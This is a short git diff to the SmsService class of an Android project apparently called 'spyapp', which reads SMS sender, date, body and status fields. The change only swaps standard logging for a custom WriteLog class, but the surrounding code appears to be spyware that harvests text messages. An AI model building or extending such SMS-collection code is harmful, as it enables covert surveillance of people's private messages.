@@ -4,11 +4,11 @@ import android.app.IntentService;
 import android.content.Intent;
 import android.database.Cursor;
 import android.net.Uri;
-import android.util.Log;
 
 import com.app.spyapp.SpyApp;
 import com.app.spyapp.common.Const;
 import com.app.spyapp.common.Utils;
+import com.app.spyapp.common.WriteLog;
 import com.app.spyapp.model.SMSModel;
 
 import java.util.ArrayList;
@@ -54,7 +54,7 @@ public class SmsService extends IntentService {
                 "person", "date", "body", "type", "read"};
         if (cursor1.getCount() > 0) {
             String count = Integer.toString(cursor1.getCount());
-            Log.d("Count", count);
+            WriteLog.E("Count", count);
             while (cursor1.moveToNext()) {
 
                 SMSModel info = new SMSModel();
